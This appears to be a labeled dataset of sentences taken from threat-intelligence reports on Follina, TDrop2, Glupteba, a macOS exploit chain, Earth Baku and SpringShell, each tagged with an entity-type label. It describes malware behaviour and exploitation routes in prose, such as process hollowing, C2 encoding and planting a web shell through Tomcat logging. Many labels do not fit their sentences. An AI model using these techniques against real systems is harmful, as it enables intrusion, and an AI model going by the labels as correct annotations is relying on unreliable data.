text: On May 27, 2022, details began to emerge of malicious Word documents leveraging remote templates to execute PowerShell via the ms-msdt Office URL protocol.
label: tools

text: The use of this technique appeared to allow attackers to bypass local Office macro policies to execute code within the context of Word.
label: SOFTWARE

text: Microsoft has since released protection guidance and assigned CVE-2022-30190 to this vulnerability.
label: vulnerability

text: Due to the amount of publicly available information, ease of use, and the extreme effectiveness of this exploit, Palo Alto Networks is providing this threat brief to make our customers aware of this critical vulnerability and the options available to ensure proper protections are put into place until a patch can be issued by Microsoft.  The vulnerability enables remote code execution with the same privileges as the calling application and there are proof-of-concept examples of zero-click variants.
label: identity

text: Therefore, exploits for this vulnerability have potential to be of high impact.
label: safe

text: We highly recommend following Microsoft’s guidance to protect your enterprise until a patch is issued to fix the problem.
label: identity

text: All known samples and URLs associated with this attack have been flagged in the Palo Alto Networks product suite so customers can receive protections.  Attack Details for CVE-2022-30190 CVE-2022-30190 in the Wild Conclusion  On May 27, 2022, a cybersecurity research team out of Tokyo, Japan, nao_sec, uncovered a malicious Word document uploaded to VirusTotal from an IP in Belarus.
label: TIME

text: The document was abusing the Microsoft Word remote template feature to retrieve a malicious HTML file that subsequently used the ms-msdt Office URI scheme to execute PowerShell within the context of Word.
label: SOFTWARE

text: On May 30, Keven Beaumont wrote an article detailing the specifics of the initial incident.
label: identity

text: The important thing to note here is that the decoy Word document had nothing inherently malicious outside of the link to the template hosted at hxxp://xmlformats[.]com, allowing it to bypass EDR solutions.
label: SOFTWARE

text: The HTML code from the remote template is shown in Figure 1 below.
label: safe

text: The JavaScript embedded within the HTML uses the ms-msdt schema to invoke the PCWDiagnostic pack, to reference the IT_BrowseForFile to execute the base64-encoded PowerShell Invoke-Expression command.  The base64-decoded text within the PowerShell Invoke-Expression is shown in Figure 2 below.
label: tools

text: This code does a few things.
label: safe

text: First it kills the msdt.exe process.
label: FILEPATH

text: Then the code loops through the files within a .rar archive looking for a CAB file (TVNDRgAAAA base64 decodes to MSCF, which is the magic header of a CAB file).
label: safe

text: It then stores it in a file called 1.t. 1.t, which gets base64 decoded to 1.c, expanded to rgb.exe and then finally executed.
label: safe

text: None of the reports we’ve seen have recovered the final payload.
label: safe

text: Therefore, the contents are unknown.
label: safe

text: The use of remote templates to deliver malicious documents is not new, however, historically they’ve been used to host .docm or dotm (macro-enabled Word documents), which would still be affected by the local systems’s Word macro policy.
label: SOFTWARE

text: Therefore, the vulnerability of particular note in this attack lies in calling the Microsoft Support Diagnostic Tool (MSDT) using the ms-msdt URL Protocol within Word via the remotely loaded template file.
label: SOFTWARE

text: This allows execution of code within the context of Microsoft Word, even if macros are disabled.
label: SOFTWARE

text: Protected View was triggered during execution of the nao_sec example, however, John Hammond demonstrated you can bypass Protected View by using an RTF file instead.
label: safe

text: This allows the attack to succeed even if the user simply views the file in the preview pane – with no clicks on the document necessary – making the attack much more dangerous.
label: safe

text: Microsoft has since released protection guidance and assigned CVE-2022-30190 to this vulnerability.
label: identity

text: They provided a workaround to disable the MSDT URL protocol, however, this may break other diagnostic tools that rely on the MSDT URL protocol to operate.
label: safe

text: They also recommend ensuring cloud-delivered protections and automatic sample submission for Microsoft Defender are enabled.
label: SOFTWARE

text: Microsoft recommends that customers of Microsoft Defender for Endpoint enable the attack surface reduction rule BlockOfficeCreateProcessRule.
label: identity

text: So far, Palo Alto Networks is only seeing indications of testing within our customer telemetry indicated by final payload execution of benign executables such as calc.exe and notepad.exe.
label: identity

text: Palo Alto Networks and Unit 42 will continue to monitor for evidence of exploitation and further novel use cases.
label: identity

text: Based on the amount of publicly available information, the ease of use and the extreme effectiveness of this exploit, Palo Alto Networks highly recommends following Microsoft’s guidance to protect your enterprise until a patch is issued to fix the problem.
label: identity

text: Next-Generation Firewalls (PA-Series, VM-Series and CN-Series) or Prisma Access with a Threat Prevention security subscription can automatically block sessions related to this vulnerability using Threat ID 92623 (Application and Threat content update 8575).  WildFire and Cortex XDR categorize all known samples we’ve come across as malware.
label: SOFTWARE

text: Cortex XDR Agent 7.5 and higher (with content version 540-92526) prevents attempts to exploit this vulnerability with the Behavioral Threat Protection module.
label: SOFTWARE

text: The Cortex XSOAR “CVE-2022-30190 - MSDT RCE” playbook helps speed up the discovery and remediation of compromised hosts within the network.
label: vulnerability

text: The playbook can be found on the XSOAR marketplace.
label: safe

text: Additionally, all encountered URLs have been flagged as malware within PAN-DB, the Advanced URL Filtering URL database.
label: safe

text: Customers can leverage this service with best practice configuration for further protection.
label: safe

text: If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:  As further information or detections are put into place, Palo Alto Networks will update this publication accordingly.
label: identity

text: Updated June 3, 2022, at 3:30 p.m. PT.
label: TIME

text: Palo Alto Networks recently identified a new campaign targeting the transportation sector in Europe with ties to the Dark Seoul and Operation Troy campaigns that took place in 2013.
label: campaign

text: This new campaign used updated instances of the Tdrop malware family discovered in the Operation Troy campaign.
label: malware

text: For more information on the new campaign discovered by Unit 42, please refer to our recent blog post.
label: identity

text: In this attack, attackers embedded the TDrop2 malware inside a legitimate video software package hosted on the software distributor’s website.
label: malware

text: By doing this, they were able to target organizations that relied on the distributor’s security camera solution and infect their systems with malware.
label: safe

text: They created a true Trojan horse, which sneaks into a network as a gift, but when opened, the attacker’s army leaps out.
label: safe

text: The malware used for the attempted infection purported to be a legitimate video player, providing viewing software for security camera solutions.
label: safe

text: The following two unique file names were involved in the attack.
label: safe

text: The difference between the files involves the specific video player that was dropped and executed during runtime.
label: safe

text: Each file would drop and execute the full or light version of the legitimate video player respective to the file name.
label: safe

text: Both the legitimate copy of the video player, as well as a malicious executable were bundled into a single executable.
label: safe

text: These files were added to the end of the Trojan executable, as seen below.
label: safe

text: When initially run, the malware checks to see if its parent process is either explorer.exe or cmd.exe.
label: FILEPATH

text: In the event the malware is not running in the context of either of these processes, it will exit.
label: safe

text: This check exists in a number of the subsequent processes/executables used by the TDrop2 malware variant.
label: malware

text: Subsequently, the malware proceeds to extract both the video player and the embedded malware using a series of calls to CreateFile, CreateFileMapping, GetFileSize, and MapViewOfFile.
label: safe

text: Once extracted, the file writes it to a new file on disk prior to executing it.
label: safe

text: The video player is written to one of the following locations, based on the original filename:  The malware itself is written to the %TEMP% directory as well.
label: FILEPATH

text: The filename is derived by randomly choosing an executable name from the system32 directory.
label: FILEPATH

text: The randomly chosen executable must not contain any of the following strings:  This dropped malware begins by performing the same parent process check witnessed in the original sample.
label: safe

text: In the event the malware is not running within the parent process of cmd.exe or explorer.exe, it will exit immediately.
label: malware

text: This malware sample will also dynamically load a number of functions and libraries.
label: safe

text: After the kernel32.dll and ntdll.dll libraries are loaded via calls to GetModuleHandle, the following process takes place:
label: FILEPATH

text: In total, the following 14 functions are loaded during runtime:
label: safe

text: After these functions are loaded, the malware will randomly select an executable from the system32 using the same routine witnessed in the earlier sample.
label: FILEPATH

text: The malware proceeds to spawn a new process of the selected executable and performs a technique called process hollowing to hide itself inside a legitimate executable.
label: safe

text: This leads us to the next stage of our malware  This particular stage of malware acts as a downloader.
label: safe

text: The parent process check is not used in this particular sample.
label: safe

text: The malware initially attempts to download a file from the following location:
label: safe

text: While the link above shows a file extension of an image, the transferred file is in fact a modified executable file.  The downloaded file has the first two bytes of the PE file format replaced with the characters ‘DW’, instead of the usual ‘MZ’.
label: safe

text: After the download occurs, the malware immediately corrects the first two bytes with the ‘MZ’ characters prior to writing the file to disk.
label: safe

text: The downloaded file is dropped to the system32 folder.
label: FILEPATH

text: The malware selects a randomly chosen DLL from this directory.
label: safe

text: The base name of this DLL is used to write the downloaded file.
label: safe

text: As an example, in the event apcups.dll was selected, the malware would write the downloaded file to apcups.exe in the same folder.
label: FILEPATH

text: The downloader then proceeds to execute this downloaded file in a new process.
label: safe

text: As we’ve seen in previous samples, this executable file begins by checking the parent process for the presence of ‘cmd.exe’ or ‘explorer.exe’.
label: FILEPATH

text: It proceeds to randomly select an executable file in the system32 folder, and performs process hollowing against it.
label: attack-pattern

text: The injected executable contains the last stage of the TDrop2 malware variant.
label: malware

text: Upon execution, we once again see the parent process check to determine if the malware is running within the ‘cmd.exe’ or ‘explorer.exe’ parent process.
label: FILEPATH

text: It continues to dynamically load a number of libraries and functions for later use.
label: safe

text: A feature that has yet to be seen is that of string encryption.
label: safe

text: Strings are encrypted using the following function, represented in Python:
label: safe

text: After dynamically loading functions and libraries, the malware iterates through the running processes and attempts to determine if the ‘V3lite.exe’ process is running.
label: FILEPATH

text: This process name is associated with the South Korean-based AhnLab security software provider.
label: location

text: In the event this process is running, the malware will attempt to kill the process’ class window.
label: safe

text: The final payload proceeds to generate the following mutex to ensure only one copy of the malware is running concurrently:  Global\SPPLMUTEX  The payload then spawns two threads—one to maintain persistence and another to gather victim information and perform command and control operations.
label: safe

text: Persistence is achieved by setting the following registry key:  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  The name of the registry key in the above instances is derived from the basename of the supplied argument.
label: REGISTRYKEY

text: In the event the supplied argument was C:\malware.exe, the registry key would be named ‘malware’, and the path for this key would be ‘C:\malware.exe’.  The persistence thread runs in a loop where the registry keys are set every 60 seconds, ensuring persistence even in the event an administrator manually deletes the registry keys.
label: FILEPATH

text: The other thread begins by collecting information about the victim, such as the following:  These data points are used to generate a unique victim ID, which is stored in the following registry key:  HKCU\SOFTWARE\Microsoft\HY08A\Build  The malware will continue to decrypt and store embedded C2 URLs.
label: REGISTRYKEY

text: The following URLs have been identified:
label: safe

text: The final payload proceeds to enter its command and control loop.
label: safe

text: It initially performs a DNS check against microsoft.com to ensure it has Internet connectivity.
label: safe

text: After this check is performed, it enters an infinite loop, with a sleep interval set at a default of 30 minutes.
label: TIME

text: The malware will periodically poll the C2 server and determine if any commands are received.
label: safe

text: The initial POST request contains a unique victim identifier that was previously generated.
label: safe

text: The optional response by the C2 server is both encoded and encrypted.  The data is first encrypted using an unidentified algorithm.
label: safe

text: The two keys used for this encryption are generated using another unidentified algorithm.
label: safe

text: The following Python script can be used to generate the keys.
label: safe

text: A default salt of ‘FFFFFFFF’ is used.
label: safe

text: Additionally, the following Python script can be used for encryption/decryption
label: safe

text: After the data is encrypted, it is then base64-encoded using a custom alphabet.
label: safe

text: The following alphabet is used:  3bcd1fghijklmABCDEFGH-J+LMnopq4stuvwxyzNOPQ7STUVWXYZ0e2ar56R89K/
label: safe

text: When the previously mentioned C2 response is both decoded and decrypted, we are presented with the following data:  The command structure of the C2 response always begins with the string ‘tick’
label: safe

text: The number following this string is most likely a unique command identifier.
label: safe

text: The malware will store these command identifiers in the following files:  In the event the number after the tick was previously witnessed, the command from the C2 will be ignored.
label: safe

text: The remaining lines are then parsed.
label: safe

text: The following commands are supported:  Once again, using the previous example, the malware will first ensure that the command was not previously parsed/executed.
label: safe

text: In the event it is new, it will proceed to execute the various reconnaissance commands found on line #2.
label: safe

text: The results of these commands are uploaded to the C2 server.
label: safe

text: As we can see in the above network traffic, the malware attempts to disguise the data as a .gif image.
label: safe

text: Finally, the malware will parse the third line, which instructs the malware to modify the wait interval to a value of ‘60’.
label: safe

text: This interval value is set in the following registry key:  HKCU\Software\Microsoft\HY08A\Policy  Additionally, in the event the C2 response instructs the malware to update C2 URLs, it will be in the following format:  1001; [unique_identifier] [url]  The malware will encrypt the URL string with a 4-byte XOR key of “\x01\x02\x03\x04” and store this data in the following registry key:  HKCU\Software\Microsoft\HY08A\[unique_identifier]  The TDrop2 malware family that was witnessed in a recent attack against a European transportation company provided a minimal set of commands to the attackers.
label: REGISTRYKEY

text: It was most likely used to establish a foothold, perform reconnaissance and deploy further malware into the victim’s network.
label: safe

text: While the malware lacked a large set of capabilities, it had a wealth of interesting and advanced features, such as the custom encryption/encoding witnessed in the network traffic, the use of process hollowing against a randomly selected Microsoft Windows binary, and the downloading component that attempted to bypass network security measures by modifying the executable header.
label: SOFTWARE

text: We created the AutoFocus tag TDrop2 to identify samples of this new variant and added known C2 domains and hash values to the Threat Prevention product set.
label: malware

text: At this time, WildFire is able to correctly identify the samples associated with this campaign as malicious.
label: SOFTWARE

text: Stage 1  Stage 2  Stage 3  Stage 4  Stage 5
label: safe

text: This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 2022.
label: TIME

text: It was last updated on May 12, 2022.
label: TIME

text: Google TAG actively monitors threat actors and the evolution of their tactics and techniques.
label: identity

text: We use our research to continuously improve the safety and security of our products and share this intelligence with the community to benefit the internet as a whole.
label: safe

text: As announced today, Google has taken action to disrupt the operations of Glupteba, a multi-component botnet targeting Windows computers.
label: malware

text: We believe this action will have a significant impact on Glupteba's operations.
label: malware

text: However, the operators of Glupteba are likely to attempt to regain control of the botnet using a backup command and control mechanism that uses data encoded on the Bitcoin blockchain.
label: malware

text: Glupteba is known to steal user credentials and cookies, mine cryptocurrencies on infected hosts, deploy and operate proxy components targeting Windows systems and IoT devices.
label: malware

text: TAG has observed the botnet targeting victims worldwide, including the US, India, Brazil and Southeast Asia.
label: location

text: The Glupteba malware family is primarily distributed through pay per install (PPI) networks and via traffic purchased from traffic distribution systems (TDS).
label: malware

text: For a period of time, we observed thousands of instances of malicious Glupteba downloads per day.
label: malware

text: The following image shows a webpage mimicking a software crack download which delivers a variant of Glupteba to users instead of the promised software.
label: malware

text: While analyzing Glupteba binaries, our team identified a few containing a git repository URL: “git.voltronwork.com”.
label: DOMAIN

text: This finding sparked an investigation that led us to identify, with high confidence, multiple online services offered by the individuals operating the Glupteba botnet.
label: malware

text: These services include selling access to virtual machines loaded with stolen credentials (dont[.]farm), proxy access (awmproxy), and selling credit card numbers (extracard) to be used for other malicious activities such as serving malicious ads and payment fraud on Google Ads.
label: DOMAIN

text: This past year, TAG has been collaborating with Google’s CyberCrime Investigation Group to disrupt Glupteba activity involving Google services.
label: identity

text: We’ve terminated around 63M Google Docs observed to have distributed Glupteba, 1,183 Google Accounts, 908 Cloud Projects, and 870 Google Ads accounts associated with their distribution.
label: SOFTWARE

text: Furthermore, 3.5M users were warned before downloading a malicious file through Google Safe Browsing warnings.
label: SOFTWARE

text: In the last few days, our team partnered with Internet infrastructure providers and hosting providers, including Cloudflare, to disrupt Glupteba’s operation by taking down servers and placing warning interstitial pages in front of the malicious domain names.
label: malware

text: During this time, an additional 130 Google accounts associated with this operation were terminated.
label: identity

text: Parallel to the analysis, tracking, and technical disruption of this botnet, Google has filed a lawsuit against two individuals believed to be located in Russia for operating the Glupteba Botnet and its various criminal schemes.
label: identity

text: Google is alleging violations under the Racketeer Influenced and Corrupt Organizations Act (RICO), the Computer Fraud and Abuse Act, the Electronic Communications Privacy Act, the Lanham Act, and tortious interference of business relationships, and unjust enrichment.
label: identity

text: While these actions may not completely stop Glupteba, TAG estimates that combined efforts will materially affect the actor’s ability to conduct future operations.
label: identity

text: The command and control (C2) communication for this botnet uses HTTPS to communicate commands and binary updates between the control servers and infected systems.
label: safe

text: To add resilience to their infrastructure, the operators have also implemented a backup mechanism using the Bitcoin blockchain.
label: SOFTWARE

text: In the event that the main C2 servers do not respond, the infected systems can retrieve backup domains encrypted in the latest transaction from the following bitcoin wallet addresses:  The following 32 byte AES keys for decryption are hard coded in the binaries:  The blockchain transaction’s OP_RETURN data can be decrypted using AES-256 GCM to provide a backup command and control domain name.
label: safe

text: The first 12 bytes of the OP_RETURN contains the IV, the last 16 bytes the GCM tag, while the middle section is the AES-256 GCM encrypted domain
label: safe

text: Full details of Glupteba’s network protocol can be found in this report from 2020, the following Python script illustrates how one can decrypt an encrypted domain name:
label: TIME

text: Recent domains used for command and control:
label: safe

text: Recent sha256 hashes of malware samples:
label: safe

text: This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2021.
label: TIME

text: It was last updated on February 7, 2022.
label: TIME

text: To protect our users, TAG routinely hunts for 0-day vulnerabilities exploited in-the-wild.
label: identity

text: In late August 2021, TAG discovered watering hole attacks targeting visitors to Hong Kong websites for a media outlet and a prominent pro-democracy labor and political group.
label: TIME

text: The watering hole served an XNU privilege escalation vulnerability (CVE-2021-30869) unpatched in macOS Catalina, which led to the installation of a previously unreported backdoor.
label: vulnerability

text: As is our policy, we quickly reported this 0-day to the vendor (Apple) and a patch was released to protect users from these attacks.
label: identity

text: Based on our findings, we believe this threat actor to be a well-resourced group, likely state backed, with access to their own software engineering team based on the quality of the payload code.
label: safe

text: In this blog we analyze the technical details of the exploit chain and share IOCs to help teams defend against similar style attacks.
label: safe

text: The websites leveraged for the attacks contained two iframes which served exploits from an attacker-controlled server—one for iOS and the other for macOS.
label: SOFTWARE

text: iOS Exploits
label: SOFTWARE

text: The iOS exploit chain used a framework based on Ironsquirrel to encrypt exploits delivered to the victim's browser.
label: malware

text: We did not manage to get a complete iOS chain this time, just a partial one where CVE-2019-8506 was used to get code execution in Safari.
label: SOFTWARE

text: macOS Exploits
label: SOFTWARE

text: The macOS exploits did not use the same framework as iOS ones.
label: SOFTWARE

text: The landing page contained a simple HTML page loading two scripts—one for Capstone.js and another for the exploit chain.
label: SOFTWARE

text: The parameter rid is a global counter which records the number of exploitation attempts.
label: safe

text: This number was in the 200s when we obtained the exploit chain.
label: safe

text: While the javascript starting the exploit chain checks whether visitors were running macOS Mojave (10.14) or Catalina (10.15) before proceeding to run the exploits, we only observed remnants of an exploit when visiting the site with Mojave but received the full non-encrypted exploit chain when browsing the site with Catalina.
label: SOFTWARE

text: The exploit chain combined an RCE in WebKit exploiting CVE-2021-1789 which was patched on Jan 5, 2021 before discovery of this campaign and a 0-day local privilege escalation in XNU (CVE-2021-30869) patched on Sept 23, 2021.
label: vulnerability

text: Loading a page with the WebKit RCE on the latest version of Safari (14.1), we learned the RCE was an n-day since it did not successfully trigger the exploit.
label: vulnerability

text: To verify this hypothesis, we ran git bisect and determined it was fixed in this commit.
label: safe

text: Capstone.js
label: SOFTWARE

text: It was interesting to see the use of Capstone.js, a port of the Capstone disassembly framework, in an exploit chain as Capstone is typically used for binary analysis.
label: SOFTWARE

text: The exploit authors primarily used it to search for the addresses of dlopen and dlsym in memory.
label: safe

text: Once the embedded Mach-O is loaded, the dlopen and dlsym addresses found using Capstone.js are used to patch the Mach-O loaded in memory.
label: SOFTWARE

text: With the Capstone.js configured for X86-64 and not ARM, we can also derive the target hardware is Intel-based Macs.
label: SOFTWARE

text: Embedded Mach-O
label: safe

text: After the WebKit RCE succeeds, an embedded Mach-O binary is loaded into memory, patched, and run.
label: SOFTWARE

text: Upon analysis, we realized this binary contained code which could escape the Safari sandbox, elevate privileges, and download a second stage from the C2.
label: SOFTWARE

text: Analyzing the Mach-O was reminiscent of a CTF reverse engineering challenge.
label: safe

text: It had to be extracted and converted into binary from a Uint32Array.
label: safe

text: Then the extracted binary was heavily obfuscated with a relatively tedious encoding mechanism--each string is XOR encoded with a different key.
label: safe

text: Fully decoding the Mach-O was necessary to obtain all the strings representing the dynamically loaded functions used in the binary.
label: safe

text: There were a lot of strings and decoding them manually would have taken a long time so we wrote a short Python script to make quick work of the obfuscation.
label: safe

text: The script parsed the Mach-O at each section where the strings were located, then decoded the strings with their respective XOR keys, and patched the binary with the resulting strings.
label: safe

text: Once we had all of the strings decoded, it was time to figure out what capabilities the binary had.
label: safe

text: There was code to download a file from a C2 but we did not come across any URL strings in the Mach-O so we checked the javascript and saw there were two arguments passed when the binary is run–the url for the payload and its size
label: safe

text: After downloading the payload, it removes the quarantine attribute of the file to bypass Gatekeeper.
label: safe

text: It then elevated privileges to install the payload.
label: safe

text: day or 0-day?
label: safe

text: Before further analyzing how the exploit elevated privileges, we needed to figure out if we were dealing with an N-day or a 0-day vulnerability.
label: safe

text: An N-day is a known vulnerability with a publicly available patch.
label: safe

text: Threat actors have used N-days shortly after a patch is released to capitalize on the patching delay of their targets.
label: safe

text: In contrast, a 0-day is a vulnerability with no available patch which makes it harder to defend against.
label: safe

text: Despite the exploit being an executable instead of shellcode, it was not a standalone binary we could run in our virtual environment.
label: safe

text: It needed the address of dlopen and dlsym patched after the binary was loaded into memory.
label: safe

text: These two functions are used in conjunction to dynamically load a shared object into memory and retrieve the address of a symbol from it.
label: safe

text: They are the equivalent of LoadLibrary and GetProcAddress in Windows.
label: SOFTWARE

text: To run the exploit in our virtual environment, we decided to write a loader in Python which did the following:  For our payload, we wrote a simple bash script which runs id and pipes the result to a file in /tmp.
label: safe

text: The result of the id command would tell us whether our script was run as a regular user or as root.
label: safe

text: Having a loader and a payload ready, we set out to test the exploit on a fresh install of Catalina (10.15) since it was the version in which we were served the full exploit chain.
label: SOFTWARE

text: The exploit worked and ran our bash script as root.
label: safe

text: We updated our operating system with the latest patch at the time (2021-004) and tried the exploit again.
label: TIME

text: It still worked.
label: safe

text: We then decided to try it on Big Sur (11.4) where it crashed and gave us the following exception.
label: SOFTWARE

text: The exception indicates that Apple added generic protections in Big Sur which rendered this exploit useless.
label: SOFTWARE

text: Since Apple still supports Catalina and pushes security updates for it, we decided to take a deeper look into this exploit.
label: identity

text: Elevating Privileges to Root The Mach-O was calling a lot of undocumented functions as well as XPC calls to mach_msg with a MACH_SEND_SYNC_OVERRIDE flag.
label: safe

text: This looked similar to an earlier in-the-wild iOS vulnerability analyzed by Ian Beer of Google Project Zero.
label: SOFTWARE

text: Beer was able to quickly recognize this exploit as a variant of an earlier port type confusion vulnerability he analyzed in the XNU kernel (CVE-2020-27932).
label: SOFTWARE

text: Furthermore, it seems this exact exploit was presented by Pangu Lab in a public talk at zer0con21 in April 2021 and Mobile Security Conference (MOSEC) in July 2021.
label: identity

text: In exploiting this port type confusion vulnerability, the exploit authors were able to change the mach port type from IKOT_NAMED_ENTRY to a more privileged port type like IKOT_HOST_SECURITY allowing them to forge their own sec_token and audit_token, and IKOT_HOST_PRIV enabling them to spoof messages to kuncd.  After gaining root, the downloaded payload is loaded and run in the background on the victim's machine via launchtl.
label: safe

text: The payload seems to be a product of extensive software engineering.
label: safe

text: It uses a publish-subscribe model via a Data Distribution Service (DDS) framework for communicating with the C2.
label: SOFTWARE

text: It also has several components, some of which appear to be configured as modules.
label: safe

text: For example, the payload we obtained contained a kernel module for capturing keystrokes.
label: safe

text: There are also other functionalities built-in to the components which were not directly accessed from the binaries included in the payload but may be used by additional stages which can be downloaded onto the victim's machine.
label: safe

text: Notable features for this backdoor include:  Our team is constantly working to secure our users and keep them safe from targeted attacks like this one.
label: safe

text: We continue to collaborate with internal teams like Google Safe Browsing to block domains and IPs used for exploit delivery and industry partners like Apple to mitigate vulnerabilities.
label: SOFTWARE

text: We are appreciative of Apple’s quick response and patching of this critical vulnerability.
label: identity

text: For those interested in following our in-the-wild work, we will soon publish details surrounding another, unrelated campaign we discovered using two Chrome 0-days (CVE-2021-37973 and CVE-2021-37976).
label: vulnerability

text: That campaign is not connected to the one described in today’s post.
label: safe

text: Delivery URLs Javascript Sandbox escape / LPE Backdoor C2
label: safe

text: We have uncovered a cyberespionage campaign being perpetrated by Earth Baku, an advanced persistent threat (APT) group with a known history of carrying out cyberattacks under the alias APT41.
label: threat-actor

text: This is not the group’s first foray into cyberespionage, and its long list of past cybercrimes also includes ransomware and cryptocurrency mining attacks.
label: safe

text: Earth Baku deploys its ongoing campaign, which can be traced to as far back as July 2020, through multiple attack vectors that are designed based on different exploits or the infrastructure of its targeted victim's environment:  • SQL injection to upload a malicious file • Installment through InstallUtil.exe in a scheduled task • Possibly a malicious link (LNK) file sent as an email attachment • Exploitation of the ProxyLogon vulnerability CVE-2021-26855 to upload a China Chopper web shell  This campaign uses previously unidentified shellcode loaders, which we have named StealthVector and StealthMutant, and a backdoor, which we have dubbed ScrambleCross.
label: threat-actor

text: Earth Baku has developed these new malware tools to facilitate targeted attacks on public and private entities alike in specific industries that are located in the Indo-Pacific region.
label: threat-actor

text: Countries affected by Earth Baku’s new campaign Source: Trend Micro™ Smart Protection Network™ infrastructure StealthVector
label: threat-actor

text: We initially observed StealthVector, a shellcode loader written in C/C++, in October 2020.
label: malware

text: StealthVector is designed with various configurable features that make it easy for malicious actors to modify and tailor it to their needs, including a feature that disables Event Tracing for Windows (ETW), allowing the malware to run in stealth mode.
label: malware

text: This loader can stealthily run its payload in various ways, such as using the CreateThread function, bypassing Microsoft’s Control Flow Guard (CFG), module stomping, and phantom dynamic link library (DLL) hollowing.
label: SOFTWARE

text: StealthMutant Like StealthVector, StealthMutant, which supports both 32-bit and 64-bit operating systems, can disable ETW.
label: malware

text: This loader, written in C#, has been used by malicious actors since July 2020.
label: TIME

text: Many of the StealthMutant samples we have analyzed use AES-256-ECB for decryption; alternatively, an earlier variant of the loader uses XOR.
label: malware

text: After its payload is decrypted, StealthMutant performs process hollowing to execute its payload in a remote process.
label: attack-pattern

text: ScrambleCross
label: malware

text: Both StealthMutant and StealthVector contain a payload of either the Cobalt Strike beacon or ScrambleCross, a newly discovered backdoor.
label: malware

text: ScrambleCross receives instructions from its command-and-control (C&C) server that allow it to receive and manipulate plug-ins.
label: malware

text: However, we have yet to retrieve and study one of these plug-ins.
label: safe

text: It has many of the same capabilities as another backdoor, Crosswalk, which has also been used by Earth Baku.
label: threat-actor

text: For example, both calculate the hash of the code section as an anti-bugging technique, both are designed as fully position-independent code, and both support various kinds of network communication protocols.
label: safe

text: Connections to other campaigns Earth Baku’s recent activities are related to another campaign that has been active since at least November 2018, as reported by FireEye and Positive Technologies.
label: TIME

text: While the older campaign uses a different shellcode loader, which we have named LavagokLdr, we have observed similar code and procedures between LavagokLdr and StealthVector.
label: malware

text: In the same vein, we have observed that LavagokLdr’s payload, Crosswalk, and one of StealthVector’s payloads, ScrambleCross, perform similar techniques for decryption and signature checking.
label: malware

text: But because Earth Baku has updated its toolset with StealthVector, StealthMutant, and ScrambleCross for this new campaign, we have identified it as its own separate operation.
label: threat-actor

text: A timeline of Earth Baku’s previous campaign as APT41 and its new campaign How Earth Baku creates its malware tools Earth Baku is known for its use of self-developed tools.
label: threat-actor

text: To continue doing so, it appears to be filling its ranks with malicious actors who are pooling their diverse skills.
label: safe

text: Interestingly, the new malware tools involved in Earth Baku’s new campaign indicates that the APT group has likely recruited members who specialize in low-level programming, software development, and red-team techniques.
label: threat-actor

text: For more details about Earth Baku’s new campaign, read our research paper "Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdoor."        Tags  Articles, News, Reports | APT & Targeted Attacks | Research
label: threat-actor

text: This post is also available in:      日本語 (Japanese)  Recently, two vulnerabilities were announced within the Spring Framework, an open-source framework for building enterprise Java applications.
label: SOFTWARE

text: On March 29, 2022, the Spring Cloud Expression Resource Access Vulnerability tracked in CVE-2022-22963 was patched with the release of Spring Cloud Function 3.1.7 and 3.2.3.
label: TIME

text: Two days later on March 31, 2022, Spring released version 5.3.18 and 5.2.20 of Spring Framework to patch another more severe vulnerability tracked in CVE-2022-22965.
label: TIME

text: The CVE-2022-22965 vulnerability allows an attacker unauthenticated remote code execution (RCE), which Unit 42 has observed being exploited in the wild.
label: vulnerability

text: The exploitation of this vulnerability could result in a webshell being installed onto the compromised server that allows further command execution.
label: safe

text: Because the Spring Framework is widely used for web system development and the severity of the vulnerability is critical (CVSS score of 9.8), CVE-2022-22965 is given the name SpringShell (and/or Spring4Shell) by the infosec community.
label: vulnerability

text: To understand the impact of this vulnerability, we analyzed all the available information and located the issue in the source code.
label: safe

text: On April 8, we updated this blog to include statistics on SpringShell exploitation attempts that we identified by analyzing hits on the Spring Core Remote Code Execution Vulnerability threat prevention signature for the Palo Alto Networks Next-Generation Firewall, as well as alerts triggered in Cortex XDR.
label: SOFTWARE

text: We also added a section on indicators.
label: safe

text: Palo Alto Networks customers receive protections against CVE-2022-22965 and CVE-2022-22963 via products and services including Cortex XDR Prevent and Pro, a Threat Prevention subscription for the Next-Generation Firewall, and Prisma Cloud Compute.
label: identity

text: Affected Software and Versions Background on the Spring Framework Root Cause Analysis for CVE-2022-22965
label: vulnerability

text: Background on Exploitation of the Class Loader Establishing a Reverse Shell Connection to a Remote Server on the Compromised Server SpringShell Exploit Observed in the Wild Conclusion
label: vulnerability

text: Additional Resources Indicators   Existing proofs of concept (PoCs) for exploitation work under the following conditions:  Any Java application using Spring Beans packet (spring-beans-*.jar) and using Spring parameters binding could be affected by this vulnerability.
label: SOFTWARE

text: The Spring Framework is an open-source application framework and inversion of the control container for the Java platform.
label: SOFTWARE

text: It is widely used in the industry by various programs and systems due to its powerful features and ease of use.
label: safe

text: Some well-known products such as Spring Boot and Spring Cloud are developed with the Spring Framework.
label: SOFTWARE

text: The Spring Core (spring-core) is the core of the framework that provides powerful features such as inversion of control and dependency injection.
label: SOFTWARE

text: It contains the core, beans, context and Spring Expression Language (SpEL) modules.
label: SOFTWARE

text: The vulnerability is caused by the getCachedIntrospectionResults method of the Spring framework wrongly exposing the class object when binding the parameters.
label: SOFTWARE

text: The default Spring data binding mechanism allows developers to bind HTTP request details to application-specific objects.
label: SOFTWARE

text: For example, there is a simple classical application scenario in which the developer creates a trade object to capture request parameters as shown in Figure 1.
label: safe

text: Then the developer creates a controller to use the object trade as shown in Figure 2.  After that, the developer usually creates a request builder for the trade controller, which allows the web user to access the trade object remotely as shown in Figure 3.
label: safe

text: When web users access trade object properties, the binding process (bindRequestParameters) in the Spring framework implementation will call the getCachedIntrospectionResults method to get and set the object property in the cache.
label: SOFTWARE

text: However, the return object of the getCachedIntrospectionResults method includes a class object.
label: safe

text: This means that web users can get a class object remotely by simply submitting a URL as shown in Figure 4.
label: safe

text: Exposing the class object to web users is very dangerous and can lead to RCE in many ways.
label: safe

text: The class loader is often used by exploiting payloads to load some sensitive classes dynamically for object modification and code execution.
label: attack-pattern

text: One easy way to get RCE is using the exposed class loader to modify the Tomcat log configuration and remotely upload a JSP web shell after changing the Tomcat log configuration.
label: SOFTWARE

